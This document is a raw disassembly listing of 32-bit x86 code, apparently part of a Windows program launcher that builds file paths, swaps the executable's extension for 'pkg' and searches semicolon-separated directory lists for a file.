  4026e6:	89 c3                	mov    %eax,%ebx
  4026e8:	0f 84 c9 02 00 00    	je     0x4029b7
  4026ee:	8b 84 24 34 30 00 00 	mov    0x3034(%esp),%eax
  4026f5:	8d 7c 24 10          	lea    0x10(%esp),%edi
  4026f9:	8d b4 24 10 10 00 00 	lea    0x1010(%esp),%esi
  402700:	8b 00                	mov    (%eax),%eax
  402702:	89 3c 24             	mov    %edi,(%esp)
  402705:	89 44 24 04          	mov    %eax,0x4(%esp)
  402709:	e8 42 06 00 00       	call   0x402d50
  40270e:	8d 84 24 10 20 00 00 	lea    0x2010(%esp),%eax
  402715:	89 7c 24 04          	mov    %edi,0x4(%esp)
  402719:	89 04 24             	mov    %eax,(%esp)
  40271c:	e8 df 06 00 00       	call   0x402e00
  402721:	89 7c 24 04          	mov    %edi,0x4(%esp)
  402725:	89 34 24             	mov    %esi,(%esp)
  402728:	e8 c3 06 00 00       	call   0x402df0
  40272d:	c7 04 24 bf c2 40 00 	movl   $0x40c2bf,(%esp)
  402734:	e8 e7 1d 00 00       	call   0x404520
  402739:	c7 04 24 bf c2 40 00 	movl   $0x40c2bf,(%esp)
  402740:	89 c5                	mov    %eax,%ebp
  402742:	e8 f9 1e 00 00       	call   0x404640
  402747:	89 f2                	mov    %esi,%edx
  402749:	8b 0a                	mov    (%edx),%ecx
  40274b:	83 c2 04             	add    $0x4,%edx
  40274e:	8d 81 ff fe fe fe    	lea    -0x1010101(%ecx),%eax
  402754:	f7 d1                	not    %ecx
  402756:	21 c8                	and    %ecx,%eax
  402758:	25 80 80 80 80       	and    $0x80808080,%eax
  40275d:	74 ea                	je     0x402749
  40275f:	89 c1                	mov    %eax,%ecx
  402761:	89 74 24 04          	mov    %esi,0x4(%esp)
  402765:	89 1c 24             	mov    %ebx,(%esp)
  402768:	c1 e9 10             	shr    $0x10,%ecx
  40276b:	a9 80 80 00 00       	test   $0x8080,%eax
  402770:	0f 44 c1             	cmove  %ecx,%eax
  402773:	8d 4a 02             	lea    0x2(%edx),%ecx
  402776:	0f 44 d1             	cmove  %ecx,%edx
  402779:	00 c0                	add    %al,%al
  40277b:	83 da 03             	sbb    $0x3,%edx
  40277e:	29 f2                	sub    %esi,%edx
  402780:	01 fa                	add    %edi,%edx
  402782:	89 54 24 08          	mov    %edx,0x8(%esp)
  402786:	e8 05 f5 ff ff       	call   0x401c90
  40278b:	85 c0                	test   %eax,%eax
  40278d:	0f 85 8d 00 00 00    	jne    0x402820
  402793:	8b 84 24 30 30 00 00 	mov    0x3030(%esp),%eax
  40279a:	85 ed                	test   %ebp,%ebp
  40279c:	89 83 70 40 00 00    	mov    %eax,0x4070(%ebx)
  4027a2:	8b 84 24 34 30 00 00 	mov    0x3034(%esp),%eax
  4027a9:	89 83 74 40 00 00    	mov    %eax,0x4074(%ebx)
  4027af:	0f 84 1e 01 00 00    	je     0x4028d3
  4027b5:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4027bc:	00 
  4027bd:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  4027c1:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4027c8:	e8 f3 29 00 00       	call   0x4051c0
  4027cd:	89 c7                	mov    %eax,%edi
  4027cf:	89 04 24             	mov    %eax,(%esp)
  4027d2:	ff 15 70 e2 41 00    	call   *0x41e270
  4027d8:	83 ec 04             	sub    $0x4,%esp
  4027db:	89 3c 24             	mov    %edi,(%esp)
  4027de:	e8 25 80 00 00       	call   0x40a808
  4027e3:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  4027e7:	89 34 24             	mov    %esi,(%esp)
  4027ea:	e8 69 80 00 00       	call   0x40a858
  4027ef:	85 c0                	test   %eax,%eax
  4027f1:	0f 85 a9 00 00 00    	jne    0x4028a0
  4027f7:	89 1c 24             	mov    %ebx,(%esp)
  4027fa:	e8 e1 fd ff ff       	call   0x4025e0
  4027ff:	89 1c 24             	mov    %ebx,(%esp)
  402802:	e8 39 fe ff ff       	call   0x402640
  402807:	89 1c 24             	mov    %ebx,(%esp)
  40280a:	89 c6                	mov    %eax,%esi
  40280c:	e8 8f fe ff ff       	call   0x4026a0
  402811:	89 f0                	mov    %esi,%eax
  402813:	81 c4 1c 30 00 00    	add    $0x301c,%esp
  402819:	5b                   	pop    %ebx
  40281a:	5e                   	pop    %esi
  40281b:	5f                   	pop    %edi
  40281c:	5d                   	pop    %ebp
  40281d:	c3                   	ret
  40281e:	66 90                	xchg   %ax,%ax
  402820:	89 f2                	mov    %esi,%edx
  402822:	8b 0a                	mov    (%edx),%ecx
  402824:	83 c2 04             	add    $0x4,%edx
  402827:	8d 81 ff fe fe fe    	lea    -0x1010101(%ecx),%eax
  40282d:	f7 d1                	not    %ecx
  40282f:	21 c8                	and    %ecx,%eax
  402831:	25 80 80 80 80       	and    $0x80808080,%eax
  402836:	74 ea                	je     0x402822
  402838:	89 c1                	mov    %eax,%ecx
  40283a:	89 74 24 04          	mov    %esi,0x4(%esp)
  40283e:	89 1c 24             	mov    %ebx,(%esp)
  402841:	c1 e9 10             	shr    $0x10,%ecx
  402844:	a9 80 80 00 00       	test   $0x8080,%eax
  402849:	0f 44 c1             	cmove  %ecx,%eax
  40284c:	8d 4a 02             	lea    0x2(%edx),%ecx
  40284f:	0f 44 d1             	cmove  %ecx,%edx
  402852:	00 c0                	add    %al,%al
  402854:	8d 84 24 10 20 00 00 	lea    0x2010(%esp),%eax
  40285b:	83 da 03             	sbb    $0x3,%edx
  40285e:	29 f2                	sub    %esi,%edx
  402860:	01 c2                	add    %eax,%edx
  402862:	89 54 24 08          	mov    %edx,0x8(%esp)
  402866:	e8 25 f4 ff ff       	call   0x401c90
  40286b:	85 c0                	test   %eax,%eax
  40286d:	0f 84 20 ff ff ff    	je     0x402793
  402873:	8d 84 24 10 20 00 00 	lea    0x2010(%esp),%eax
  40287a:	89 7c 24 04          	mov    %edi,0x4(%esp)
  40287e:	c7 04 24 cc c2 40 00 	movl   $0x40c2cc,(%esp)
  402885:	89 44 24 08          	mov    %eax,0x8(%esp)
  402889:	e8 82 f5 ff ff       	call   0x401e10
  40288e:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402893:	e9 7b ff ff ff       	jmp    0x402813
  402898:	90                   	nop
  402899:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4028a0:	8d b3 68 20 00 00    	lea    0x2068(%ebx),%esi
  4028a6:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  4028aa:	89 34 24             	mov    %esi,(%esp)
  4028ad:	e8 76 7f 00 00       	call   0x40a828
  4028b2:	8d 83 68 30 00 00    	lea    0x3068(%ebx),%eax
  4028b8:	89 74 24 04          	mov    %esi,0x4(%esp)
  4028bc:	c7 83 68 40 00 00 01 	movl   $0x1,0x4068(%ebx)
  4028c3:	00 00 00 
  4028c6:	89 04 24             	mov    %eax,(%esp)
  4028c9:	e8 5a 7f 00 00       	call   0x40a828
  4028ce:	e9 24 ff ff ff       	jmp    0x4027f7
  4028d3:	89 1c 24             	mov    %ebx,(%esp)
  4028d6:	e8 65 f9 ff ff       	call   0x402240
  4028db:	85 c0                	test   %eax,%eax
  4028dd:	0f 84 8d 00 00 00    	je     0x402970
  4028e3:	89 1c 24             	mov    %ebx,(%esp)
  4028e6:	e8 d5 f9 ff ff       	call   0x4022c0
  4028eb:	85 c0                	test   %eax,%eax
  4028ed:	0f 85 b0 00 00 00    	jne    0x4029a3
  4028f3:	80 bb 68 20 00 00 00 	cmpb   $0x0,0x2068(%ebx)
  4028fa:	8d ab 68 20 00 00    	lea    0x2068(%ebx),%ebp
  402900:	c7 04 24 bf c2 40 00 	movl   $0x40c2bf,(%esp)
  402907:	0f 45 f5             	cmovne %ebp,%esi
  40290a:	89 74 24 04          	mov    %esi,0x4(%esp)
  40290e:	e8 bd 1c 00 00       	call   0x4045d0
  402913:	c7 04 24 bf c2 40 00 	movl   $0x40c2bf,(%esp)
  40291a:	e8 01 1c 00 00       	call   0x404520
  40291f:	89 1c 24             	mov    %ebx,(%esp)
  402922:	e8 09 23 00 00       	call   0x404c30
  402927:	83 f8 ff             	cmp    $0xffffffff,%eax
  40292a:	74 77                	je     0x4029a3
  40292c:	e8 7f fd ff ff       	call   0x4026b0
  402931:	8b 84 24 34 30 00 00 	mov    0x3034(%esp),%eax
  402938:	89 3c 24             	mov    %edi,(%esp)
  40293b:	89 44 24 08          	mov    %eax,0x8(%esp)
  40293f:	8b 84 24 30 30 00 00 	mov    0x3030(%esp),%eax
  402946:	89 44 24 04          	mov    %eax,0x4(%esp)
  40294a:	e8 f1 22 00 00       	call   0x404c40
  40294f:	83 bb 68 40 00 00 01 	cmpl   $0x1,0x4068(%ebx)
  402956:	89 c6                	mov    %eax,%esi
  402958:	74 53                	je     0x4029ad
  40295a:	89 1c 24             	mov    %ebx,(%esp)
  40295d:	e8 de f3 ff ff       	call   0x401d40
  402962:	89 f0                	mov    %esi,%eax
  402964:	e9 aa fe ff ff       	jmp    0x402813
  402969:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402970:	89 74 24 04          	mov    %esi,0x4(%esp)
  402974:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  40297b:	00 
  40297c:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402983:	e8 38 28 00 00       	call   0x4051c0
  402988:	89 c6                	mov    %eax,%esi
  40298a:	89 04 24             	mov    %eax,(%esp)
  40298d:	ff 15 70 e2 41 00    	call   *0x41e270
  402993:	83 ec 04             	sub    $0x4,%esp
  402996:	89 34 24             	mov    %esi,(%esp)
  402999:	e8 6a 7e 00 00       	call   0x40a808
  40299e:	e9 54 fe ff ff       	jmp    0x4027f7
  4029a3:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4029a8:	e9 66 fe ff ff       	jmp    0x402813
  4029ad:	89 2c 24             	mov    %ebp,(%esp)
  4029b0:	e8 0b 1e 00 00       	call   0x4047c0
  4029b5:	eb a3                	jmp    0x40295a
  4029b7:	c7 04 24 94 c2 40 00 	movl   $0x40c294,(%esp)
  4029be:	e8 4d f4 ff ff       	call   0x401e10
  4029c3:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4029c8:	e9 46 fe ff ff       	jmp    0x402813
  4029cd:	90                   	nop
  4029ce:	90                   	nop
  4029cf:	90                   	nop
  4029d0:	56                   	push   %esi
  4029d1:	53                   	push   %ebx
  4029d2:	83 ec 14             	sub    $0x14,%esp
  4029d5:	8b 74 24 24          	mov    0x24(%esp),%esi
  4029d9:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  4029dd:	89 34 24             	mov    %esi,(%esp)
  4029e0:	e8 53 7e 00 00       	call   0x40a838
  4029e5:	83 c0 01             	add    $0x1,%eax
  4029e8:	89 74 24 04          	mov    %esi,0x4(%esp)
  4029ec:	89 1c 24             	mov    %ebx,(%esp)
  4029ef:	89 44 24 08          	mov    %eax,0x8(%esp)
  4029f3:	e8 70 7e 00 00       	call   0x40a868
  4029f8:	89 1c 24             	mov    %ebx,(%esp)
  4029fb:	e8 38 7e 00 00       	call   0x40a838
  402a00:	01 d8                	add    %ebx,%eax
  402a02:	80 38 5c             	cmpb   $0x5c,(%eax)
  402a05:	74 1d                	je     0x402a24
  402a07:	c7 44 24 04 5c 00 00 	movl   $0x5c,0x4(%esp)
  402a0e:	00 
  402a0f:	89 1c 24             	mov    %ebx,(%esp)
  402a12:	e8 59 7e 00 00       	call   0x40a870
  402a17:	85 c0                	test   %eax,%eax
  402a19:	74 15                	je     0x402a30
  402a1b:	c6 00 00             	movb   $0x0,(%eax)
  402a1e:	83 c4 14             	add    $0x14,%esp
  402a21:	5b                   	pop    %ebx
  402a22:	5e                   	pop    %esi
  402a23:	c3                   	ret
  402a24:	c6 00 00             	movb   $0x0,(%eax)
  402a27:	eb de                	jmp    0x402a07
  402a29:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402a30:	c6 03 2e             	movb   $0x2e,(%ebx)
  402a33:	c6 43 01 00          	movb   $0x0,0x1(%ebx)
  402a37:	83 c4 14             	add    $0x14,%esp
  402a3a:	5b                   	pop    %ebx
  402a3b:	5e                   	pop    %esi
  402a3c:	c3                   	ret
  402a3d:	8d 76 00             	lea    0x0(%esi),%esi
  402a40:	56                   	push   %esi
  402a41:	53                   	push   %ebx
  402a42:	83 ec 14             	sub    $0x14,%esp
  402a45:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  402a49:	c7 44 24 04 5c 00 00 	movl   $0x5c,0x4(%esp)
  402a50:	00 
  402a51:	8b 74 24 20          	mov    0x20(%esp),%esi
  402a55:	89 1c 24             	mov    %ebx,(%esp)
  402a58:	e8 13 7e 00 00       	call   0x40a870
  402a5d:	85 c0                	test   %eax,%eax
  402a5f:	74 1f                	je     0x402a80
  402a61:	8d 58 01             	lea    0x1(%eax),%ebx
  402a64:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  402a68:	89 74 24 20          	mov    %esi,0x20(%esp)
  402a6c:	83 c4 14             	add    $0x14,%esp
  402a6f:	5b                   	pop    %ebx
  402a70:	5e                   	pop    %esi
  402a71:	e9 b2 7d 00 00       	jmp    0x40a828
  402a76:	8d 76 00             	lea    0x0(%esi),%esi
  402a79:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402a80:	c7 44 24 04 2f 00 00 	movl   $0x2f,0x4(%esp)
  402a87:	00 
  402a88:	89 1c 24             	mov    %ebx,(%esp)
  402a8b:	e8 e0 7d 00 00       	call   0x40a870
  402a90:	85 c0                	test   %eax,%eax
  402a92:	74 d0                	je     0x402a64
  402a94:	eb cb                	jmp    0x402a61
  402a96:	8d 76 00             	lea    0x0(%esi),%esi
  402a99:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402aa0:	55                   	push   %ebp
  402aa1:	57                   	push   %edi
  402aa2:	56                   	push   %esi
  402aa3:	53                   	push   %ebx
  402aa4:	83 ec 1c             	sub    $0x1c,%esp
  402aa7:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  402aab:	8b 6c 24 34          	mov    0x34(%esp),%ebp
  402aaf:	8b 74 24 38          	mov    0x38(%esp),%esi
  402ab3:	85 db                	test   %ebx,%ebx
  402ab5:	0f 84 a5 00 00 00    	je     0x402b60
  402abb:	8d 7b 04             	lea    0x4(%ebx),%edi
  402abe:	89 d9                	mov    %ebx,%ecx
  402ac0:	31 c0                	xor    %eax,%eax
  402ac2:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  402ac8:	c7 83 fc 0f 00 00 00 	movl   $0x0,0xffc(%ebx)
  402acf:	00 00 00 
  402ad2:	83 e7 fc             	and    $0xfffffffc,%edi
  402ad5:	29 f9                	sub    %edi,%ecx
  402ad7:	81 c1 00 10 00 00    	add    $0x1000,%ecx
  402add:	c1 e9 02             	shr    $0x2,%ecx
  402ae0:	f3 ab                	rep stos %eax,%es:(%edi)
  402ae2:	89 2c 24             	mov    %ebp,(%esp)
  402ae5:	e8 4e 7d 00 00       	call   0x40a838
  402aea:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  402aee:	89 44 24 08          	mov    %eax,0x8(%esp)
  402af2:	89 1c 24             	mov    %ebx,(%esp)
  402af5:	e8 6e 7d 00 00       	call   0x40a868
  402afa:	89 1c 24             	mov    %ebx,(%esp)
  402afd:	e8 36 7d 00 00       	call   0x40a838
  402b02:	80 7c 03 ff 5c       	cmpb   $0x5c,-0x1(%ebx,%eax,1)
  402b07:	74 09                	je     0x402b12
  402b09:	c6 04 03 5c          	movb   $0x5c,(%ebx,%eax,1)
  402b0d:	c6 44 03 01 00       	movb   $0x0,0x1(%ebx,%eax,1)
  402b12:	89 34 24             	mov    %esi,(%esp)
  402b15:	e8 1e 7d 00 00       	call   0x40a838
  402b1a:	80 7c 06 ff 5c       	cmpb   $0x5c,-0x1(%esi,%eax,1)
  402b1f:	74 1f                	je     0x402b40
  402b21:	89 74 24 04          	mov    %esi,0x4(%esp)
  402b25:	89 1c 24             	mov    %ebx,(%esp)
  402b28:	e8 03 7d 00 00       	call   0x40a830
  402b2d:	89 d8                	mov    %ebx,%eax
  402b2f:	83 c4 1c             	add    $0x1c,%esp
  402b32:	5b                   	pop    %ebx
  402b33:	5e                   	pop    %esi
  402b34:	5f                   	pop    %edi
  402b35:	5d                   	pop    %ebp
  402b36:	c3                   	ret
  402b37:	89 f6                	mov    %esi,%esi
  402b39:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402b40:	83 e8 02             	sub    $0x2,%eax
  402b43:	89 74 24 04          	mov    %esi,0x4(%esp)
  402b47:	89 1c 24             	mov    %ebx,(%esp)
  402b4a:	89 44 24 08          	mov    %eax,0x8(%esp)
  402b4e:	e8 25 7d 00 00       	call   0x40a878
  402b53:	83 c4 1c             	add    $0x1c,%esp
  402b56:	89 d8                	mov    %ebx,%eax
  402b58:	5b                   	pop    %ebx
  402b59:	5e                   	pop    %esi
  402b5a:	5f                   	pop    %edi
  402b5b:	5d                   	pop    %ebp
  402b5c:	c3                   	ret
  402b5d:	8d 76 00             	lea    0x0(%esi),%esi
  402b60:	89 2c 24             	mov    %ebp,(%esp)
  402b63:	e8 d0 7c 00 00       	call   0x40a838
  402b68:	89 34 24             	mov    %esi,(%esp)
  402b6b:	89 c3                	mov    %eax,%ebx
  402b6d:	e8 c6 7c 00 00       	call   0x40a838
  402b72:	8d 7c 03 02          	lea    0x2(%ebx,%eax,1),%edi
  402b76:	89 3c 24             	mov    %edi,(%esp)
  402b79:	e8 42 7c 00 00       	call   0x40a7c0
  402b7e:	85 c0                	test   %eax,%eax
  402b80:	89 c3                	mov    %eax,%ebx
  402b82:	74 19                	je     0x402b9d
  402b84:	89 7c 24 08          	mov    %edi,0x8(%esp)
  402b88:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  402b8f:	00 
  402b90:	89 04 24             	mov    %eax,(%esp)
  402b93:	e8 e8 7c 00 00       	call   0x40a880
  402b98:	e9 45 ff ff ff       	jmp    0x402ae2
  402b9d:	31 c0                	xor    %eax,%eax
  402b9f:	eb 8e                	jmp    0x402b2f
  402ba1:	eb 0d                	jmp    0x402bb0
  402ba3:	90                   	nop
  402ba4:	90                   	nop
  402ba5:	90                   	nop
  402ba6:	90                   	nop
  402ba7:	90                   	nop
  402ba8:	90                   	nop
  402ba9:	90                   	nop
  402baa:	90                   	nop
  402bab:	90                   	nop
  402bac:	90                   	nop
  402bad:	90                   	nop
  402bae:	90                   	nop
  402baf:	90                   	nop
  402bb0:	f3 c3                	repz ret
  402bb2:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402bb9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402bc0:	83 ec 1c             	sub    $0x1c,%esp
  402bc3:	8b 44 24 24          	mov    0x24(%esp),%eax
  402bc7:	89 44 24 08          	mov    %eax,0x8(%esp)
  402bcb:	8b 44 24 28          	mov    0x28(%esp),%eax
  402bcf:	89 44 24 04          	mov    %eax,0x4(%esp)
  402bd3:	8b 44 24 20          	mov    0x20(%esp),%eax
  402bd7:	89 04 24             	mov    %eax,(%esp)
  402bda:	ff 15 dc e2 41 00    	call   *0x41e2dc
  402be0:	85 c0                	test   %eax,%eax
  402be2:	0f 95 c0             	setne  %al
  402be5:	83 c4 1c             	add    $0x1c,%esp
  402be8:	0f b6 c0             	movzbl %al,%eax
  402beb:	c3                   	ret
  402bec:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402bf0:	53                   	push   %ebx
  402bf1:	b8 48 20 00 00       	mov    $0x2048,%eax
  402bf6:	e8 55 79 00 00       	call   0x40a550
  402bfb:	29 c4                	sub    %eax,%esp
  402bfd:	8b 84 24 50 20 00 00 	mov    0x2050(%esp),%eax
  402c04:	8d 5c 24 3e          	lea    0x3e(%esp),%ebx
  402c08:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  402c0f:	00 
  402c10:	89 1c 24             	mov    %ebx,(%esp)
  402c13:	89 44 24 04          	mov    %eax,0x4(%esp)
  402c17:	e8 a4 25 00 00       	call   0x4051c0
  402c1c:	8d 44 24 18          	lea    0x18(%esp),%eax
  402c20:	89 1c 24             	mov    %ebx,(%esp)
  402c23:	89 44 24 04          	mov    %eax,0x4(%esp)
  402c27:	ff 15 20 e3 41 00    	call   *0x41e320
  402c2d:	85 c0                	test   %eax,%eax
  402c2f:	0f 94 c0             	sete   %al
  402c32:	81 c4 48 20 00 00    	add    $0x2048,%esp
  402c38:	0f b6 c0             	movzbl %al,%eax
  402c3b:	5b                   	pop    %ebx
  402c3c:	c3                   	ret
  402c3d:	8d 76 00             	lea    0x0(%esi),%esi
  402c40:	55                   	push   %ebp
  402c41:	57                   	push   %edi
  402c42:	b8 3c 20 00 00       	mov    $0x203c,%eax
  402c47:	56                   	push   %esi
  402c48:	53                   	push   %ebx
  402c49:	e8 02 79 00 00       	call   0x40a550
  402c4e:	29 c4                	sub    %eax,%esp
  402c50:	c7 04 24 f0 c2 40 00 	movl   $0x40c2f0,(%esp)
  402c57:	e8 2c 7c 00 00       	call   0x40a888
  402c5c:	85 c0                	test   %eax,%eax
  402c5e:	89 c5                	mov    %eax,%ebp
  402c60:	0f 84 ad 00 00 00    	je     0x402d13
  402c66:	8d 7c 24 2e          	lea    0x2e(%esp),%edi
  402c6a:	8d b4 24 2f 10 00 00 	lea    0x102f(%esp),%esi
  402c71:	eb 55                	jmp    0x402cc8
  402c73:	89 c3                	mov    %eax,%ebx
  402c75:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  402c79:	b8 00 10 00 00       	mov    $0x1000,%eax
  402c7e:	29 eb                	sub    %ebp,%ebx
  402c80:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  402c84:	89 3c 24             	mov    %edi,(%esp)
  402c87:	81 fb 00 10 00 00    	cmp    $0x1000,%ebx
  402c8d:	0f 47 d8             	cmova  %eax,%ebx
  402c90:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  402c94:	e8 cf 7b 00 00       	call   0x40a868
  402c99:	8b 84 24 54 20 00 00 	mov    0x2054(%esp),%eax
  402ca0:	c6 44 1c 2e 00       	movb   $0x0,0x2e(%esp,%ebx,1)
  402ca5:	89 7c 24 04          	mov    %edi,0x4(%esp)
  402ca9:	89 34 24             	mov    %esi,(%esp)
  402cac:	89 44 24 08          	mov    %eax,0x8(%esp)
  402cb0:	e8 eb fd ff ff       	call   0x402aa0
  402cb5:	89 34 24             	mov    %esi,(%esp)
  402cb8:	e8 33 ff ff ff       	call   0x402bf0
  402cbd:	85 c0                	test   %eax,%eax
  402cbf:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  402cc3:	75 5e                	jne    0x402d23
  402cc5:	8d 69 01             	lea    0x1(%ecx),%ebp
  402cc8:	c7 44 24 04 3b 00 00 	movl   $0x3b,0x4(%esp)
  402ccf:	00 
  402cd0:	89 2c 24             	mov    %ebp,(%esp)
  402cd3:	e8 b8 7b 00 00       	call   0x40a890
  402cd8:	85 c0                	test   %eax,%eax
  402cda:	75 97                	jne    0x402c73
  402cdc:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  402ce3:	00 
  402ce4:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  402ce8:	89 3c 24             	mov    %edi,(%esp)
  402ceb:	e8 78 7b 00 00       	call   0x40a868
  402cf0:	8b 84 24 54 20 00 00 	mov    0x2054(%esp),%eax
  402cf7:	89 7c 24 04          	mov    %edi,0x4(%esp)
  402cfb:	89 34 24             	mov    %esi,(%esp)
  402cfe:	89 44 24 08          	mov    %eax,0x8(%esp)
  402d02:	e8 99 fd ff ff       	call   0x402aa0
  402d07:	89 34 24             	mov    %esi,(%esp)
  402d0a:	e8 e1 fe ff ff       	call   0x402bf0
  402d0f:	85 c0                	test   %eax,%eax
  402d11:	75 10                	jne    0x402d23
  402d13:	81 c4 3c 20 00 00    	add    $0x203c,%esp
  402d19:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402d1e:	5b                   	pop    %ebx
  402d1f:	5e                   	pop    %esi
  402d20:	5f                   	pop    %edi
  402d21:	5d                   	pop    %ebp
  402d22:	c3                   	ret
  402d23:	8b 84 24 50 20 00 00 	mov    0x2050(%esp),%eax
  402d2a:	89 74 24 04          	mov    %esi,0x4(%esp)
  402d2e:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  402d35:	00 
  402d36:	89 04 24             	mov    %eax,(%esp)
  402d39:	e8 2a 7b 00 00       	call   0x40a868
  402d3e:	81 c4 3c 20 00 00    	add    $0x203c,%esp
  402d44:	31 c0                	xor    %eax,%eax
  402d46:	5b                   	pop    %ebx
  402d47:	5e                   	pop    %esi
  402d48:	5f                   	pop    %edi
  402d49:	5d                   	pop    %ebp
  402d4a:	c3                   	ret
  402d4b:	90                   	nop
  402d4c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402d50:	53                   	push   %ebx
  402d51:	b8 18 20 00 00       	mov    $0x2018,%eax
  402d56:	e8 f5 77 00 00       	call   0x40a550
  402d5b:	29 c4                	sub    %eax,%esp
  402d5d:	8d 5c 24 10          	lea    0x10(%esp),%ebx
  402d61:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  402d68:	00 
  402d69:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402d70:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  402d74:	ff 15 38 e2 41 00    	call   *0x41e238
  402d7a:	83 ec 0c             	sub    $0xc,%esp
  402d7d:	85 c0                	test   %eax,%eax
  402d7f:	74 2f                	je     0x402db0
  402d81:	8b 84 24 20 20 00 00 	mov    0x2020(%esp),%eax
  402d88:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  402d8f:	00 
  402d90:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  402d94:	89 04 24             	mov    %eax,(%esp)
  402d97:	e8 84 22 00 00       	call   0x405020
  402d9c:	85 c0                	test   %eax,%eax
  402d9e:	74 2c                	je     0x402dcc
  402da0:	31 c0                	xor    %eax,%eax
  402da2:	81 c4 18 20 00 00    	add    $0x2018,%esp
  402da8:	5b                   	pop    %ebx
  402da9:	c3                   	ret
  402daa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402db0:	e8 7b 20 00 00       	call   0x404e30
  402db5:	c7 04 24 f8 c2 40 00 	movl   $0x40c2f8,(%esp)
  402dbc:	89 44 24 04          	mov    %eax,0x4(%esp)
  402dc0:	e8 4b f0 ff ff       	call   0x401e10
  402dc5:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402dca:	eb d6                	jmp    0x402da2
  402dcc:	e8 5f 20 00 00       	call   0x404e30
  402dd1:	c7 04 24 30 c3 40 00 	movl   $0x40c330,(%esp)
  402dd8:	89 44 24 04          	mov    %eax,0x4(%esp)
  402ddc:	e8 2f f0 ff ff       	call   0x401e10
  402de1:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402de6:	eb ba                	jmp    0x402da2
  402de8:	90                   	nop
  402de9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402df0:	e9 db fb ff ff       	jmp    0x4029d0
  402df5:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402df9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402e00:	53                   	push   %ebx
  402e01:	83 ec 18             	sub    $0x18,%esp
  402e04:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  402e08:	8b 44 24 24          	mov    0x24(%esp),%eax
  402e0c:	89 1c 24             	mov    %ebx,(%esp)
  402e0f:	89 44 24 04          	mov    %eax,0x4(%esp)
  402e13:	e8 10 7a 00 00       	call   0x40a828
  402e18:	89 1c 24             	mov    %ebx,(%esp)
  402e1b:	e8 18 7a 00 00       	call   0x40a838
  402e20:	c7 44 03 fd 70 6b 67 	movl   $0x676b70,-0x3(%ebx,%eax,1)
  402e27:	00 
  402e28:	83 c4 18             	add    $0x18,%esp
  402e2b:	5b                   	pop    %ebx
  402e2c:	c3                   	ret
  402e2d:	8d 76 00             	lea    0x0(%esi),%esi
  402e30:	56                   	push   %esi
  402e31:	53                   	push   %ebx
  402e32:	81 ec 34 02 00 00    	sub    $0x234,%esp
  402e38:	8b 84 24 40 02 00 00 	mov    0x240(%esp),%eax
  402e3f:	8d 5c 24 28          	lea    0x28(%esp),%ebx
  402e43:	c7 44 24 08 04 01 00 	movl   $0x104,0x8(%esp)
  402e4a:	00 
  402e4b:	8d 74 24 14          	lea    0x14(%esp),%esi
  402e4f:	89 1c 24             	mov    %ebx,(%esp)
  402e52:	89 44 24 04          	mov    %eax,0x4(%esp)
  402e56:	e8 65 23 00 00       	call   0x4051c0
  402e5b:	8b 84 24 44 02 00 00 	mov    0x244(%esp),%eax
  402e62:	89 34 24             	mov    %esi,(%esp)
  402e65:	c7 44 24 08 0a 00 00 	movl   $0xa,0x8(%esp)
  402e6c:	00 
  402e6d:	89 44 24 04          	mov    %eax,0x4(%esp)
  402e71:	e8 4a 23 00 00       	call   0x4051c0
  402e76:	89 74 24 04          	mov    %esi,0x4(%esp)
  402e7a:	89 1c 24             	mov    %ebx,(%esp)
  402e7d:	ff 15 1c e3 41 00    	call   *0x41e31c
  402e83:	81 c4 34 02 00 00    	add    $0x234,%esp
  402e89:	5b                   	pop    %ebx
  402e8a:	5e                   	pop    %esi
  402e8b:	c3                   	ret
  402e8c:	90                   	nop
  402e8d:	90                   	nop
  402e8e:	90                   	nop
  402e8f:	90                   	nop
